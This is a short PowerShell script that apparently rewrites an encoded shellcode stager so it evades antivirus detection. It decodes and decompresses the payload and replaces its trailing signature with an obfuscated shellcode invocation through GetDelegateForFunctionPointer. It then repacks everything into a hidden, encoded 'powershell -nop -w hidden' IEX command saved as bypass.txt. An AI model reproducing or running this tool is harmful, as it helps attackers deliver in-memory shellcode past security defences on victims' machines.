$encoded = $(cat encoded.txt).Split(" ")[5]
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
$payload = $decoded.Split("""))").Split("(")[3]
$last2char = $payload.Substring($payload.Length - 2)
$payload = $payload.Substring(0, $payload.Length-2)
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($payload + $last2char))
$obj = New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))
$decompressedpayload = $obj.ReadToEnd()
$signature = $decompressedpayload.Substring($decompressedpayload.Length - 185)
$decompressedpayload = $decompressedpayload.Replace($signature," ")
$unsignature = @"

    `$zero = "Zero"
	`$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	`$var_runme.Invoke([IntPtr]::`$zero)
}
"@
$decompressedpayload = $decompressedpayload + $unsignature
$s =  New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Compress)
$sw = New-Object System.IO.StreamWriter($cs)
$sw.Write($decompressedpayload)
$sw.Close();
$bs = [System.Convert]::ToBase64String($s.ToArray())

$newdecoded = @"
`$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String("$($bs)"));`$end="ReadToEnd";IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(`$s,[IO.Compression.CompressionMode]::Decompress))).`$end();
"@


$bsnew = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($newdecoded))
$command = "powershell -nop -w hidden -encodedcommand $bsnew"
$command | Out-File -FilePath .\bypass.txt